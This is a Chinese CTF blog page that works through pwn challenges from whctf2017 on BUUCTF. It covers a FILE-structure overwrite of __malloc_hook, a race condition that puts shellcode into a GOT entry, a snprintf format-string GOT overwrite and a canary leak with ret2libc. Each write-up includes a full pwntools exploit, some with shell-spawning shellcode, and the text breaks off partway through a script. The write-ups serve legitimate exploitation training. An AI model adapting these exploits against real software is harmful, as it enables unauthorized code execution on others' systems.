<h1 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26765</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)#这里本地还是远程，自己切换一下库</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">puts_plt_addr=e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got_addr=e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi_ret=<span class="number">0x401ab3</span></span><br><span class="line">call_puts_addr=<span class="number">0x4018B5</span></span><br><span class="line">payload=<span class="string">&#x27;admin\x00\x00\x00&#x27;</span>+p64(pop_rdi_ret)+p64(puts_got_addr)+p64(call_puts_addr)</span><br><span class="line">p.sendafter(<span class="string">&#x27;&gt;&#x27;</span>,payload)</span><br><span class="line">payload=<span class="string">&#x27;admin\x00\x00\x00&#x27;</span>*<span class="number">4</span>+p64(<span class="number">0x602400</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;&gt;&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">puts_addr=u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc_base=puts_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="comment">#yuancheng 0x4527a</span></span><br><span class="line">one_gadget=libc_base+<span class="number">0x4527a</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#bendi</span></span><br><span class="line"><span class="comment">#one_gadget=libc_base+0x4f302</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">payload=<span class="string">&#x27;admin\x00\x00\x00&#x27;</span>*<span class="number">3</span>+p64(one_gadget)</span><br><span class="line">p.sendafter(<span class="string">&#x27;&gt;&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;admin\x00\x00\x00&#x27;</span>*<span class="number">4</span>+p64(<span class="number">0x602400</span>+<span class="number">0x18</span>)<span class="comment">#迁移到one_gadget</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;&gt;&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<p>下面这个是第一次只输入admin，第二次同时布置one_gadget和控制rbp的exp。可以看出来，这个exp和上面的区别也仅仅是最后一点不一样。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26765</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">puts_plt_addr=e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got_addr=e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi_ret=<span class="number">0x401ab3</span></span><br><span class="line">call_puts_addr=<span class="number">0x4018B5</span></span><br><span class="line">payload=<span class="string">&#x27;admin\x00\x00\x00&#x27;</span>+p64(pop_rdi_ret)+p64(puts_got_addr)+p64(call_puts_addr)</span><br><span class="line">pause()</span><br><span class="line">p.sendafter(<span class="string">&#x27;&gt;&#x27;</span>,payload)</span><br><span class="line">payload=<span class="string">&#x27;admin\x00\x00\x00&#x27;</span>*<span class="number">4</span>+p64(<span class="number">0x602400</span>)</span><br><span class="line">pause()</span><br><span class="line">p.sendafter(<span class="string">&#x27;&gt;&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">puts_addr=u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc_base=puts_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="comment">#yuancheng 0x4527a</span></span><br><span class="line">one_gadget=libc_base+<span class="number">0x4527a</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#bendi</span></span><br><span class="line"><span class="comment">#one_gadget=libc_base+0x4f302</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">pause()</span><br><span class="line">payload=<span class="string">&#x27;admin\x00\x00\x00&#x27;</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;&gt;&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;admin\x00\x00\x00&#x27;</span>*<span class="number">3</span>+p64(one_gadget)+p64(<span class="number">0x602400</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;&gt;&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/../img/2706180-20220331215347474-154784131.png"></p>
<p>ps：最后值得一提的是，这两个exp，第一个最后是并没有执行两次leave;ret获取shell的，而是执行了一次leave就获取了shell，第二次则需要执行两回leave;ret才能获取shell。经过调试，我还是没有发现这种差异的根本原因是在哪里。如果各位师傅有弄的这个问题的，还请告知我这个菜鸡。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/1694f8f0.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011626843.jpg">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/1694f8f0.html" class="post-title-link" itemprop="url">whctf2017 pwn题wp</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2023-05-15 07:36:47" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2022-12-30 22:35:08" itemprop="dateModified" datetime="2022-12-30T22:35:08+08:00">2022-12-30</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/buu%E5%88%B7%E9%A2%98/" itemprop="url" rel="index"><span itemprop="name">buu刷题</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>今天做题的时候无意做了一道buu上的whctf2017 stackoverflow,做完之后发现另外几道whctf2017的题目也很不错，就打算全做了都学习一下，题目全部在buu上都可以找到</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>简单总结一下这四道题，它们分别考察了如下的知识点：</p>
<p>第一题考察了scanf函数最终的输入是在内部的<code>count = _IO_SYSREAD(fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</code>这行代码，只要能控制这几个字段并且对其他一些字段进行绕过，就可以实现IO的任意地址写</p>
<p>第二题考察了条件竞争漏洞，在多线程的操作中访问同一个全局变量没有加锁，在delete函数中让全局指针被减到了位于got表的位置，从而malloc申请堆块的地址写入了got表里，没有开NX导致堆可执行，从而劫持got表跳转到堆的shellcode上</p>
<p>第三题考察的是snprintf执行中的格式化字符串漏洞，snprintf是一个字符一个字符来处理的，可能是采取了一种循环遍历的方式，所以即使最初调用snprintf的时候format是%s，但后续的操作中format被改变了，然后再取格式化字符的时候触发了漏洞。<strong>snprintf拷贝字符的时候可能存在溢出</strong></p>
<p>第四题考察的是未初始化漏洞，在打印之前，没有对操作的指针进行初始化，从而使用了栈里的残留数据，泄露出了canary，配合gets的栈溢出漏洞，ret2libc获取shell</p>
<h2 id="whctf2017-stackoverflow"><a href="#whctf2017-stackoverflow" class="headerlink" title="whctf2017_stackoverflow"></a>whctf2017_stackoverflow</h2><h3 id="保护策略"><a href="#保护策略" class="headerlink" title="保护策略"></a>保护策略</h3><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212130846592.png" alt="image-20221213084612401" style="zoom:50%;" />

<h3 id="漏洞所在"><a href="#漏洞所在" class="headerlink" title="漏洞所在"></a>漏洞所在</h3><p>第一个漏洞点是往栈里输入数据之后没有0截断，并且使用了%s打印数据，从而可以泄露栈里存储的libc地址(如下)</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212130846562.png" alt="image-20221213084641509" style="zoom:50%;" />

<p>第二个漏洞是v2和size可以不一样，如果size大于0x300000的话，可以重新输入size(但是v2没有被更新)，而malloc函数申请大于128KB(0x20000 bit)的内存时会调用mmap在内存共享区映射出来一块内存，这片内存和libc里的地址存在固定偏移，我们提前控制一个v2的话就可以向任意一个libc地址写入一个0(如下)</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212130903387.png" alt="image-20221213090336309" style="zoom:50%;" />



<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>scanf的调用流程为scanf-&gt;vfscanf-&gt;__uflow-&gt;_IO_default_uflow()-&gt;underflow-&gt;_IO_file_underflow()</p>
<p>在最后的这个函数中有段代码调用了read  如下</p>
<p><code>count = _IO_SYSREAD(fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</code></p>
<p>如果我们可以控制IO_buf_base，并且保证_IO_buf_end - _IO_buf_base不为0，就能实现地址任意写的目的。</p>
<p>不过需要绕过下面的检查，也就是要IO_read_ptr等于IO_read_end</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end) </span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *)fp-&gt;_IO_read_ptr;</span><br></pre></td></tr></table></figure>



<p>我们的思路是向_IO_buf_base的地址里写入一个0，从而去再次控制_IO_buf_base字段。如下</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212131100968.png" alt="image-20221213110056374" style="zoom:50%;" />

<p>此时的buf_base中的地址末尾已经被篡改为了00，所以下次可以向0x7f8d614a3900这个地址里写入(buf_end-buf_base)个字节的数据，该地址是_IO_write_base字段，下次输入的话，我们控制buf_base为malloc_hook的地址，而buf_end至少要为malloc_hook-8（因为buf_end-buf_base就是下次往malloc_hook里写入的字节数）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212131101394.png" alt="image-20221213110142157"></p>
<p>篡改后的buf_base和buf_end如下，此时还无法往malloc_hook里写入数据，因为_IO_read_ptr和_IO_read_end并不相同。而当前函数被不断循环，其中IO_getc(stdin)函数可以刷新_IO_read_ptr，让其从输入缓冲区中读入一个字节的数据，并且让read_ptr指针加1，因此我们随便输入数据，触发getc函数39次就可以让read_ptr和read_end相同，从而往malloc_hook里写入one_gadget，在之后调用malloc函数的时候即可获取shell</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212131104947.png" alt="image-20221213110433209"></p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:25978&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;leave your name, bro:&quot;</span>,<span class="string">&quot;a&quot;</span>*<span class="number">40</span>)</span><br><span class="line">libc_base=recv_libc()-<span class="number">0x7b947</span><span class="comment">#-0x7b957#</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">malloc_hook=libc_base+libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;please input the size to trigger stackoverflow: &quot;</span>,<span class="built_in">str</span>(<span class="number">0x5c5908</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;please input the size to trigger stackoverflow: &quot;</span>,<span class="built_in">str</span>(<span class="number">0x200000</span>))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;padding and ropchain: &quot;</span>,<span class="string">&quot;b&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">debug(p,<span class="number">0x400A45</span>,<span class="number">0x4008FF</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;please input the size to trigger stackoverflow: &quot;</span>,<span class="string">b&#x27;s&#x27;</span>*<span class="number">0x18</span>+p64(malloc_hook)+p64(malloc_hook+<span class="number">0x8</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;padding and ropchain: &quot;</span>,p64(<span class="number">0xdeadbeef</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">39</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;please input the size to trigger stackoverflow: &quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;please input the size to trigger stackoverflow: &quot;</span>,p64(search_og(<span class="number">3</span>)+libc_base))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212131111298.png" alt="image-20221213111146066"></p>
<h2 id="whctf2017-note-sys"><a href="#whctf2017-note-sys" class="headerlink" title="whctf2017_note_sys"></a>whctf2017_note_sys</h2><h3 id="保护策略-1"><a href="#保护策略-1" class="headerlink" title="保护策略"></a>保护策略</h3><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212131657725.png" alt="image-20221213165703414" style="zoom:50%;" />

<h3 id="漏洞所在-1"><a href="#漏洞所在-1" class="headerlink" title="漏洞所在"></a>漏洞所在</h3><p>本题是有一个add函数和delete函数，不过都是去创建了一个子进程来调用函数。</p>
<p>在两个函数中都涉及到了对同一个全局变量进行操作，在add函数中malloc申请堆块后将地址存入了202080指向的位置(这个位置是2020C0)，每次执行add函数的时候都会将202080指向的地址+8，也就是执行完当前函数再执行add函数，就是将malloc返回的地址写入2020c8里</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212131659243.png" alt="image-20221213165948173" style="zoom:50%;" />

<p>而执行delete函数则是每次执行完都让202080指向的地址-8(如下)，但需要注意的是先在202080指向的地址-8之后有一个usleep（这里会休眠两秒钟），而后再去执行下面的free函数部分</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212131707847.png" alt="image-20221213170753777" style="zoom:50%;" />

<h3 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h3><p>核心点是delete函数在子进程中被执行，并且父进程里没有pthread_join函数，这意味着我们可以趁着子进程执行delete函数的空隙，让父进程再次调用delete函数，让202080指向的地址2020c0不断去-8，减到got表的位置。再执行add函数，malloc申请一个堆块，向堆块里写入shellcode，此时malloc返回的地址被写入到了free的got表里，最终调用free函数的时候触发shellcode</p>
<p>正常情况下去free掉got地址会报错，但此处的条件竞争是在执行free函数前不断开启多个子进程对一个全局变量进行操作，<strong>还没有执行到free函数崩溃前就已经把shellcode写到了free的got表里获取了shell</strong></p>
<p>循环22次也很好算 (0x2020c0-0x202018-8)&#x2F;8&#x3D;22   （这里不能直接写free的got地址，应该再减8字节，因为最后add的时候是先加了八字节）</p>
<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:28673&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">22</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice:\n&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">xor rax,rax</span></span><br><span class="line"><span class="string">push 0x3b</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">xor rdi,rdi</span></span><br><span class="line"><span class="string">mov rdi ,0x68732f2f6e69622f</span></span><br><span class="line"><span class="string">xor rsi,rsi</span></span><br><span class="line"><span class="string">push rsi</span></span><br><span class="line"><span class="string">push rdi</span></span><br><span class="line"><span class="string">push rsp</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">xor rdx,rdx</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">b&quot;\x48\x31\xC0\x6A\x3B\x58\x48\x31\xFF\x48\xBF\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x48\x31\xF6\x56\x57\x54\x5F\x48\x31\xD2\x0F\x05&quot;</span></span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0xB66</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;choice:\n&quot;</span>,<span class="string">&quot;0&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;input your note, no more than 250 characters\n&quot;</span>,shellcode)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;choice:\n&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212131726043.png" alt="image-20221213172644320"></p>
<h2 id="whctf2017-easypwn"><a href="#whctf2017-easypwn" class="headerlink" title="whctf2017_easypwn"></a>whctf2017_easypwn</h2><h3 id="保护策略-2"><a href="#保护策略-2" class="headerlink" title="保护策略"></a>保护策略</h3><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212301822473.png" alt="image-20221230182239349" style="zoom:50%;" />

<h3 id="漏洞所在-2"><a href="#漏洞所在-2" class="headerlink" title="漏洞所在"></a>漏洞所在</h3><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212301823966.png" alt="image-20221230182343891" style="zoom:50%;" />

<p>v3可被覆盖控制，而v3是format参数，可控就代表着存在格式化字符串漏洞。</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212301831494.png" alt="image-20221230183118429" style="zoom:50%;" />

<p>snprintf会将s的数据拷贝0x7d0到v2上面，但是s和v2仅相离0x400，也就是说如果s写入0x400的话，拷贝到v2里面的时候就会溢出0x18个字节(v2和v3仅相距0x3e8个字节)从而控制v3，触发格式化字符串漏洞。</p>
<h3 id="利用思路-2"><a href="#利用思路-2" class="headerlink" title="利用思路"></a>利用思路</h3><p>relro保护开的是partial relro，这意味着可以篡改GOT表，而程序的此处莫名其妙的出现了一个free函数(如下)，并且free掉堆块的内容可控，很明显是想让我们劫持free的got表为system，然后堆块里面写入&#x2F;bin&#x2F;sh最后执行free获取shell</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212301905510.png" alt="image-20221230190529433"></p>
<p>利用的时候有几个点需要注意一下：</p>
<p>1 就是格式化字符串利用的时候，发现0x3e8后不能直接触发漏洞，需要填充两个字符串才能利用(这里是试出来的，原因未知)</p>
<p>  <img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212301909592.png" alt="image-20221230190941547"></p>
<p>2 本题属于snprintf执行中的格式化字符串漏洞，snprintf是一个字符一个字符来处理的，可能是采取了一种循环遍历的方式，所以即使最初调用snprintf的时候format是%s，但后续的操作中format被改变了，然后再取格式化字符的时候触发了漏洞。</p>
<p>3 snprintf函数的format是在第三个参数的位置，所以算栈顶偏移的时候不是和以前加6，而是加4。</p>
<p>4 我这里是跑了三次循环，每次改写free函数的got表两个字节，三次下来就写了system的6字节地址。</p>
<p>5 这里写入数据的话，肯定是要减去前面发送的垃圾数据0x3e8个a,但是后面的0x16不知道咋来的，但这里也是可以试出来的，先减去0x3e8后，发现自己要写的值和实际写入的值差了0x16，那就在exp里多减0x16就能得到正确的值。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212301916047.png" alt="image-20221230191633995"></p>
<p>PS：exp不是一定能打通，因为如果libc地址的低位比较小的话，会导致payload后面没有对齐，不过这个概率不大，没打通的话多跑两次就行</p>
<h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;b&quot;</span>,<span class="string">&quot;node4.buuoj.cn:27618&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Input Your Code:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0xC05</span>)</span><br><span class="line">payload=<span class="string">&quot;a&quot;</span>*<span class="number">0x3e8</span>+<span class="string">&quot;b&quot;</span>*<span class="number">2</span>+<span class="string">&quot;%396$p%397$p&quot;</span><span class="comment"># libc addr 393+4</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Welcome To WHCTF2017:\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;397$p\n&quot;</span>)</span><br><span class="line">base_addr=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">0xda0</span></span><br><span class="line">log_addr(<span class="string">&#x27;base_addr&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_base=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">0x20830</span><span class="comment">#0x20840</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">value=(libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">x=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    log_info(<span class="built_in">hex</span>(value%<span class="number">0x10000</span>))</span><br><span class="line">    payload=<span class="string">b&quot;a&quot;</span>*<span class="number">0x3e8</span>+<span class="string">b&quot;bb%&quot;</span>+<span class="built_in">str</span>(value%<span class="number">0x10000</span>-<span class="number">0x3e8</span>-<span class="number">0x16</span>).encode()+<span class="string">b&quot;c%133$hn&quot;</span>+p64(base_addr+e.got[<span class="string">&#x27;free&#x27;</span>]+i*<span class="number">2</span>)</span><br><span class="line">    value=value&gt;&gt;<span class="number">16</span></span><br><span class="line">    sleep(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input Your Code:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Welcome To WHCTF2017:\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0xD40</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Input Your Code:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Input Your Name:\n&quot;</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212301808658.png" alt="image-20221230180818030" style="zoom:50%;" />



<h2 id="whctf2017-rc4"><a href="#whctf2017-rc4" class="headerlink" title="whctf2017_rc4"></a>whctf2017_rc4</h2><h3 id="保护策略-3"><a href="#保护策略-3" class="headerlink" title="保护策略"></a>保护策略</h3><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212302213510.png" alt="image-20221230221340383" style="zoom:50%;" />

<h3 id="漏洞所在-3"><a href="#漏洞所在-3" class="headerlink" title="漏洞所在"></a>漏洞所在</h3><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212302214459.png" alt="image-20221230221432405" style="zoom: 50%;" />

<p>这里存在了一个无法触发的格式化字符串漏洞，因为v1取的是一个字节的数据，但是rand生成的随机数是四字节的，无论如何也无法通过这个If检查触发格式化字符串漏洞</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212302216225.png" alt="image-20221230221652145" style="zoom:50%;" />

<p>这里存在一个未初始化漏洞，如果进入这个函数不选择a b或者c的话，那么会跳转到LABEL_12的地方，而v2这个位置则是一个canary(这里我是先看roderick师傅写的wp，说可以利用这里泄露出来canary，然后调试了一下发现确实如此，如果单纯看代码的话确实无法发现这里是一个canary)</p>
<p>这个canary又被放到了*0x6020D8的位置，而后有个打印函数将0x6020D0开始16个字节进行了泄露，由此得到了canary</p>
<p>下图展示的代码部分还存在一个明显的栈溢出漏洞</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212302222846.png" alt="image-20221230222229763" style="zoom:50%;" />

<h3 id="利用思路-3"><a href="#利用思路-3" class="headerlink" title="利用思路"></a>利用思路</h3><p>先泄露canary，然后利用栈溢出打ret2libc，我这里选择返回的是bss段上，进行了一个栈迁移，最后迁移过去的执行流是调用了execve(“&#x2F;bin&#x2F;sh\x00”,0,0) 当时用system发现没打通，索性就换成execve系统调用了</p>
<h3 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:26330&quot;</span>)</span><br><span class="line">pop_rdi=<span class="number">0x0000000000401283</span></span><br><span class="line">bss_addr=<span class="number">0x6020D8</span></span><br><span class="line">leave_ret=<span class="number">0x401218</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="string">&quot;b&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span 